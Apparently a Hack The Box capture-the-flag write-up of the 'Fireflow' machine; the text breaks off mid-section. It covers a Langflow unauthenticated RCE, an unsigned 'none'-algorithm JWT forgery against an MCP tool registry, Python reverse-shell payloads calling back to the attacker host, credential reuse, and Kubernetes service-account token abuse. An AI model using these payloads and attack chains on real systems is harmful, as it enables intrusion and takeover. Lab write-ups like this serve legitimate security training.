---
title: Fireflow
summary: Medium Hack The Box Linux machine, written up by Ethan Bauer. Covers SSH (22), HTTP (443), flow subdomain.
date: 2026-08-22
tags: [Hack The Box, Linux]
difficulty: medium
os: Linux
url: https://app.hackthebox.com/machines/Fireflow
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Fireflow%20-%20LInux/Fireflow%20%5BLinux%5D%20%5BMedium%5D.md
---

# Fireflow
## Enumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.48.171
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 17:02 +0100
Nmap scan report for 10.129.48.171
Host is up (0.018s latency).
Not shown: 62762 closed tcp ports (conn-refused), 2771 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
```

### Nmap
```python
nmap -p 22,443 -A --min-rate=2000 -sT 10.129.48.171  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 17:04 +0100
Nmap scan report for fireflow.htb (10.129.48.171)
Host is up (0.013s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp open  ssl/http nginx
|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap detects the domain `fireflow.htb`

## SSH (22)
### Auth method
```python
ssh root@fireflow.htb                   
The authenticity of host 'fireflow.htb (10.129.48.171)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'fireflow.htb' (ED25519) to the list of known hosts.
root@fireflow.htb's password:
```

Password based authentication

## HTTP (443)

### Subdomains
```python
ffuf -u https://fireflow.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.fireflow.htb' -ic -c -t 30 -fs 162

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fireflow.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 162
________________________________________________

flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 32ms]
```

Found a subdomain

Feroxbuster found nothing on the main site

Nuclei also did not find anything on the main site

![Screenshot](images/fireflow/pasted-image-20260822171555.webp)

There is a link on the home page to what looks like an AI chatbot

This takes me to the subdomain

## `flow` subdomain

### Nuclei
```python
nuclei -u https://flow.fireflow.htb/

[CVE-2026-33017] [http] [critical] https://flow.fireflow.htb/api/v1/version
[waf-detect:nginxgeneric] [http] [info] https://flow.fireflow.htb/
[ssh-auth-methods] [javascript] [info] flow.fireflow.htb:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] flow.fireflow.htb:22
[ssh-sha1-hmac-algo] [javascript] [info] flow.fireflow.htb:22
[ssh-server-enumeration] [javascript] [info] flow.fireflow.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16"]
[tls-version] [ssl] [info] flow.fireflow.htb:443 ["tls12"]
[tls-version] [ssl] [info] flow.fireflow.htb:443 ["tls13"]
[weak-csp-detect:unsafe-default-src] [http] [info] https://flow.fireflow.htb/ ["default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;"]
[missing-sri] [http] [info] https://flow.fireflow.htb/ ["https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"]
[langflow-detect] [http] [info] https://flow.fireflow.htb/api/v1/version ["1.8.2"]
[tech-detect:google-font-api] [http] [info] https://flow.fireflow.htb/
[tech-detect:nginx] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:permissions-policy] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:x-frame-options] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:strict-transport-security] [http] [info] https://flow.fireflow.htb/
[redoc-api-docs] [http] [info] https://flow.fireflow.htb/redoc
[openapi] [http] [info] https://flow.fireflow.htb/openapi.json
[ssl-issuer] [ssl] [info] flow.fireflow.htb:443 ["Task Force Nightfall"]
[self-signed-ssl] [ssl] [low] flow.fireflow.htb:443
[ssl-dns-names] [ssl] [info] flow.fireflow.htb:443 ["fireflow.htb","*.fireflow.htb"]
[wildcard-tls] [ssl] [info] flow.fireflow.htb:443 ["SAN: [fireflow.htb *.fireflow.htb]","CN: fireflow.htb"]
```

Found a critical CVE

```python
curl https://flow.fireflow.htb/api/v1/version -k
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

Curling the endpoint nuclei gave in the output also gave me the version of langflow

And after some research i see the CVE ID does line up with the version, it is an unauthenticated remote code execution exploit

## CVE-2026-33017

> Langflow is a Python framework for building large language model-backed (LLM) workflows as visual flow graphs. One of its API endpoints, POST `/api/v1/build_public_tmp`/{flow_id}`/flow`, accepts a JSON body containing a code field and evaluates that code as Python in the service’s own process context. The endpoint is unauthenticated. It exists to allow users to prototype flows without logging in. What it actually does, in any instance exposed to the public internet, is handing a full, server-side code execution to anyone who sends a POST.

https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx

However after some research i basically need to make a request to the `auto_logon` API endpoint to retrieve a super user token

```python
curl -s -k https://flow.fireflow.htb/api/v1/auto_login                        
{"detail":{"message":"Auto login is disabled.","auto_login":false}}
```

In this instance `auto_logon` is disabled, so therefor i need to find a flow ID of an existing flow

This can still work it just means i cant generate my own flow ID, i need to find an existing one if there is one

After some research i see the flow_id is passed in the request

![Screenshot](images/fireflow/pasted-image-20260822180110.webp)

So when im on the chatbot, ill open dev tools network tab, then type something into the prompt, then grab this request and read the path

Ive identified a public flow_id to be:

```python
7d84d636-af65-42e4-ac38-26e867052c25
```

This is also reflected in the URL of the chatbot

https://github.com/EQSTLab/CVE-2026-33017

Ive found a POC

```python
penelope -p 1337
```

Ill start a listener

On the first attempt, this attack fails, and reviewing the code i see its not handling HTTPS

![Screenshot](images/fireflow/pasted-image-20260822181512.webp)

To fix this ill add a simple line to the `send_payload()` function

```python
python3 exploit.py --url https://flow.fireflow.htb/ --flow-id '7d84d636-af65-42e4-ac38-26e867052c25' --lhost 10.10.14.61 --lport 1337
[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
[*] Callback: 10.10.14.61:1337
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1110: InsecureRequestWarning: Unverified HTTPS request is being made to host 'flow.fireflow.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
```

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => fireflow 10.129.48.171 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/fireflow~10.129.48.171-Linux-x86_64/2026_08_22-18_15_44-799.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@fireflow:/var/lib/langflow$ whoami
www-data
www-data@fireflow:/var/lib/langflow$
```

I now have a shell on the system

## Enumeration as `www-data`

```python
www-data@fireflow:/var/lib/langflow$ ls -la /home
total 12
drwxr-xr-x  3 root      root      4096 May 12 15:28 .
drwxr-xr-x 23 root      root      4096 May 12 15:28 ..
drwxr-x---  5 nightfall nightfall 4096 May 12 15:28 nightfall
www-data@fireflow:/var/lib/langflow$ 
```

There is one user on the system!

```python
www-data@fireflow:/var/lib/langflow$ env
LANGFLOW_LOG_LEVEL=warning
SHELL=/usr/bin/bash
USER_AGENT=langflow
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
SERVER_SOFTWARE=gunicorn/22.0.0
LANGFLOW_NEW_USER_IS_ACTIVE=False
PWD=/var/lib/langflow
LOGNAME=www-data
LANGFLOW_SUPERUSER=langflow
SYSTEMD_EXEC_PID=1507
LANGFLOW_CONFIG_DIR=/var/lib/langflow
HOME=/var/www
LANG=en_US.UTF-8
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/langflow.service/memory.pressure
INVOCATION_ID=b36394c51ffb472eb8325b72775841ad
TERM=xterm-256color
USER=www-data
LANGFLOW_AUTO_LOGIN=False
SHLVL=2
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
JOURNAL_STREAM=8:9199
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
_=/usr/bin/env
OLDPWD=/var/lib/langflow/ba4fe756-d6f7-4c7a-a7b1-f986206878ec
www-data@fireflow:/var/lib/langflow$
```

There is a password stored in the environment variable

```python
n1ghtm4r3_b4_n1ghtf4ll
```

Ill first try this on the nightfall user

## SSH access as `nightfall`

```python
ssh nightfall@fireflow.htb
nightfall@fireflow.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug 22 05:20:54 PM UTC 2026

  System load:           0.01
  Usage of /:            84.9% of 15.58GB
  Memory usage:          50%
  Swap usage:            0%
  Processes:             245
  Users logged in:       0
  IPv4 address for eth0: 10.129.48.171
  IPv6 address for eth0: dead:beef::a0de:adff:feb4:c902

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
nightfall@fireflow:~$
```

Using the pasword stored in the environment variable, i get SSH access

## Enumeration as `nightfall`

```python
nightfall@fireflow:~/.mcp$ cat config.json 
{
  "server": "http://10.129.48.171:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
nightfall@fireflow:~/.mcp$
```

Found another password!

Looks like there is an MCP server running

![Screenshot](images/fireflow/pasted-image-20260822184150.webp)

Critically, it looks like it supports `none` algorithm, which means i might be able to forge a JWT for the application without a signature

First of all to make this easier i can forward this service to my machine, using an SSH tunnel

```python
ssh nightfall@fireflow.htb -L :30080:127.0.0.1:30080
nightfall@fireflow.htb's password:
```

So ill log back in and forward the service to my machine!

```python
curl -s http://127.0.0.1:30080/api/v1/version | jq .
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": [
      "HS256",
      "none"
    ]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

As a POC i can now curl the service from my machine!

## Crafting admin JWT 

```python
curl -X POST -s http://127.0.0.1:30080/api/v1/auth --data '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' -H 'Content-Type: application/json' | jq .
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
```

So first ill use the auth endpoint and send the username and password i found, and then use jq to parse the json data nicely

I now have an access token, it does support none algorithm

![Screenshot](images/fireflow/pasted-image-20260822195906.webp)

Ill decode the first parts of the token, and get this output

Now i simply get the output, modify the user to be admin and the algorithm to `none`

```python
echo '{"alg":"none","typ":"JWT"}' | base64               
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K

echo '{"sub":"ethan","role":"admin"}' | base64         
eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg==
```

Now i have taken the output from the decode modified it and re-encoded it, now all i need to do is put it together

```python
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.
```

Ill strip the `=` away from the second part since its not needed, the i can leave the last part out since i am using the `none` algorithm so it does not need a signature

```python
curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' | jq .
{
  "detail": [
    {
      "type": "missing",
      "loc": [
        "body"
      ],
      "msg": "Field required",
      "input": null
    }
  ]
}
```

It allows me to authenticate!

## RCE via malicious application registration

![Screenshot](images/fireflow/pasted-image-20260822203158.webp)

So i can reach the `/docs` endpoint in my browser and read through this section, this tells me what i need to pass to register an application

```python
{"name":"shell","description":"RCE","inputSchema":{"additionalProperties":{}},"code":""}
```

After reading the docs i came up with this that ill pass as data, then ill pass a python reverse shell into the `code` parameter

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.61\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")
```

This is the the shell ill use, ill bypass `"` by placing a `\` before to escape them

```python
curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' --data '{"name":"shell","description":"RCE","inputSchema":{"additionalProperties":{}},"code":"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.61\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"}' | jq .

{
  "status": "registered",
  "name": "shell"
}
```

Ill use the same request as before when i first crafted the JWT, but this time ill pass the payload as data

```python
curl -s http://127.0.0.1:30080/api/v1/tools
[{"name":"ping_host","description":"Ping a target host 3 times and return ICMP output."},{"name":"get_metrics_summary","description":"Return a summary of system memory and load average from /proc."},{"name":"list_running_tasks","description":"List the top 20 running processes sorted by CPU usage."},{"name":"shell","description":"RCE"}]
```

Then making a GET request to the `/tools` endpoint i can see my tool registered!

```python
penelope -p 1337
```

Then ill start a listener 

```python
curl -X POST -s http://127.0.0.1:30080/mcp -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' --data '{"jsonrpc":"2.0","id":"5","method":"tools/call","params":{"name":"shell","arguments":{"location":""}}}' | jq .
```

Then following the MCP documentation i can call the tool

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.48.171 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <1>
[+] Attempting to deploy Python Agent...
[+] PTY upgrade successful via /usr/local/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/mcp-server-54464cb475-29ztf~10.129.48.171-Linux-x86_64/2026_08_22-21_10_24-821.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
mcp@mcp-server-54464cb475-29ztf:/app$ whoami
mcp
mcp@mcp-server-54464cb475-29ztf:/app$
```

I now have a shell, but this shell dies shorly after, probably because the process is not running indefinitely

To get around this i can use a different python reverse shell with persistence

```python
import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.14.61\",1337))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")
```

This is the shell i will use

So it looks like its removed my tool, so ill re add it with the new shell

```python
curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' --data '{"name":"shell","description":"RCE","inputSchema":{"additionalProperties":{}},"code":"import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.14.61\",1337))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"}' | jq .
{
  "status": "registered",
  "name": "shell"
}
```

Now the new tool is registered with the persistent shell

```python
curl -X POST -s http://127.0.0.1:30080/mcp -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' --data '{"jsonrpc":"2.0","id":"5","method":"tools/call","params":{"name":"shell","arguments":{"location":""}}}' | jq .
{
  "jsonrpc": "2.0",
  "id": "5",
  "result": {
    "content": [
      {
        "type": "text",
        "text": ""
      }
    ],
    "isError": false
  }
}
```

Then ill trigger it

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.48.171 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <1>
[+] Attempting to deploy Python Agent...
[+] PTY upgrade successful via /usr/local/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/mcp-server-54464cb475-29ztf~10.129.48.171-Linux-x86_64/2026_08_22-21_24_25-968.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
mcp@mcp-server-54464cb475-29ztf:/app$ whoami
mcp
mcp@mcp-server-54464cb475-29ztf:/app$
```

Now i have a session that does not die!

## Enumeration as `mcp` user

```python
mcp@mcp-server-54464cb475-29ztf:/app$ cat main.py 
from __future__ import annotations

import json
import subprocess
from typing import Any, Dict, Optional

from fastapi import Depends, FastAPI, HTTPException, Request, Response, status
from fastapi.responses import JSONResponse
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from jose import JWTError
from jose import jwt as jose_jwt
from pydantic import BaseModel

app = FastAPI(
    title="MCP AI Tool Registry — Task Force Nightfall",
)

JWT_SECRET = "mcp-jwt-secret-do-not-share"
JWT_ALGORITHM = "HS256"

USERS: Dict[str, Dict[str, str]] = {
    "langflow-bot":   {"password": "Langfl0w@mcp2026!", "role": "user"},
    "nightfall-admin": {"password": "4dm1n@NightfallOps!", "role": "admin"},
}

...[SNIP]...
```

Found some hardcoded credentials in the code!

```python
mcp@mcp-server-54464cb475-29ztf:/app$ env
SHELL=/usr/bin/bash
KUBERNETES_SERVICE_PORT_HTTPS=443
PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
KUBERNETES_SERVICE_PORT=443
HOSTNAME=mcp-server-54464cb475-29ztf
PYTHON_VERSION=3.11.15
PWD=/app
MCP_SERVER_SERVICE_HOST=10.43.250.195
MCP_SERVER_SERVICE_PORT=8080
HOME=/home/mcp
MCP_SERVER_PORT_8080_TCP_PROTO=tcp
LANG=C.UTF-8
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.7z=01;31:*.ace=01;31:*.alz=01;31:*.apk=01;31:*.arc=01;31:*.arj=01;31:*.bz=01;31:*.bz2=01;31:*.cab=01;31:*.cpio=01;31:*.crate=01;31:*.deb=01;31:*.drpm=01;31:*.dwm=01;31:*.dz=01;31:*.ear=01;31:*.egg=01;31:*.esd=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lrz=01;31:*.lz=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.lzo=01;31:*.pyz=01;31:*.rar=01;31:*.rpm=01;31:*.rz=01;31:*.sar=01;31:*.swm=01;31:*.t7z=01;31:*.tar=01;31:*.taz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tgz=01;31:*.tlz=01;31:*.txz=01;31:*.tz=01;31:*.tzo=01;31:*.tzst=01;31:*.udeb=01;31:*.war=01;31:*.whl=01;31:*.wim=01;31:*.xz=01;31:*.z=01;31:*.zip=01;31:*.zoo=01;31:*.zst=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.jxl=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
MCP_SERVER_PORT_8080_TCP_PORT=8080
MCP_SERVER_PORT_8080_TCP_ADDR=10.43.250.195
TERM=xterm-256color
SHLVL=1
MCP_SERVER_PORT=tcp://10.43.250.195:8080
KUBERNETES_PORT_443_TCP_PROTO=tcp
MCP_SERVER_SERVICE_PORT_HTTP=8080
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
MCP_SERVER_PORT_8080_TCP=tcp://10.43.250.195:8080
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
mcp@mcp-server-54464cb475-29ztf:/app$ 
```

Kubernetes install on port 443

```python
nightfall@fireflow:~$ netstat -ano | grep LISTEN
tcp        0      0 127.0.0.1:46595         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:7860          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:10010         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:10249         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:10248         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:10259         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:10258         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:10257         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:10256         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:6444          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::9100                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::6443                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::10250                :::*                    LISTEN      off (0.00/0/0)
```

A lot of ports that are common in kubernetes

## Kubernetes proxy/node abuse to get code execution as root

https://www.aquasec.com/blog/privilege-escalation-kubernetes-rbac/

https://grahamhelton.com/blog/nodes-proxy-rce

```python
mcp@mcp-server-54464cb475-29ztf:~$ ls -al /var/run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt 3 root root  140 Aug 24 15:06 .
drwxr-xr-x 3 root root 4096 Aug 24 15:06 ..
drwxr-xr-x 2 root root  100 Aug 24 15:06 ..2026_08_24_15_06_27.474867771
lrwxrwxrwx 1 root root   31 Aug 24 15:06 ..data -> ..2026_08_24_15_06_27.474867771
lrwxrwxrwx 1 root root   13 Aug 24 15:06 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Aug 24 15:06 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Aug 24 15:06 token -> ..data/token
```

This information found in this directory will be important, and as seen i have a full permissions on these files

```python
mcp@mcp-server-54464cb475-29ztf:~$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
mcp@mcp-server-54464cb475-29ztf:~$ CA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
mcp@mcp-server-54464cb475-29ztf:~$ NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

Ill export all these values as variables

```python
